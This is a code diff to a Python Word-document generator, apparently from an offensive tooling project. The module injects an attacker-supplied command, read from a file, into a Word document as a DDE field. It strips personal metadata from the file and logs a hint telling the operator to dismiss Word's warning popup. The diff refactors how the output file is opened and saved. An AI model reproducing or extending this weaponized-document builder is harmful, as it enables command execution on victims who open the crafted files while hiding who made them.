@@ -3,6 +3,7 @@
 
 # Only enabled on windows
 import sys
+from common.utils import MSTypes
 if sys.platform == "win32":
     # Download and install pywin32 from https://sourceforge.net/projects/pywin32/files/pywin32/
     import win32com.client # @UnresolvedImport
@@ -26,25 +27,15 @@ class WordDDE(WordGenerator):
         if commandFile == "":
             logging.error("   [!] Could not find cmd input!")
             return
-        
-        self.enableVbom()
 
         logging.info("   [-] Open document...")
         # open up an instance of Word with the win32com driver
         word = win32com.client.Dispatch("Word.Application")
         # do the operation in background without actually opening Excel
         word.Visible = False
-        document = word.Documents.Add()
+        document = word.Documents.Open(self.outputFilePath)
 
-        logging.info("   [-] Save Document...")
-        wdFormatXMLDocument = 12
-        wdFormatDocument = 0
-        if self.word97FilePath is not None:
-            document.SaveAs(self.word97FilePath, FileFormat=wdFormatDocument)
-        if self.wordFilePath is not None:
-            document.SaveAs(self.wordFilePath, FileFormat=wdFormatXMLDocument)
-
-        logging.info("   [-] Inject DDE field...")
+        logging.info("   [-] Inject DDE field (Answer 'No' to popup)...")
         with open (commandFile, "r") as f:
             command=f.read()
         
@@ -58,19 +49,14 @@ class WordDDE(WordGenerator):
         logging.info("   [-] Remove hidden data and personal info...")
         wdRDIAll=99
         document.RemoveDocumentInformation(wdRDIAll)
+        logging.info("   [-] Save Document...")
         document.Save()
         document.Close()
         word.Application.Quit()
         # garbage collection
         del word
         
-        self.disableVbom()
-        
-        if self.word97FilePath is not None:
-            logging.info("   [-] Generated Word file path: %s" % self.word97FilePath)
-        
-        if self.wordFilePath is not None:
-            logging.info("   [-] Generated Word file path: %s" % self.wordFilePath)
+        logging.info("   [-] Generated %s file path: %s" % (self.outputFileType, self.outputFilePath))
          
         
         
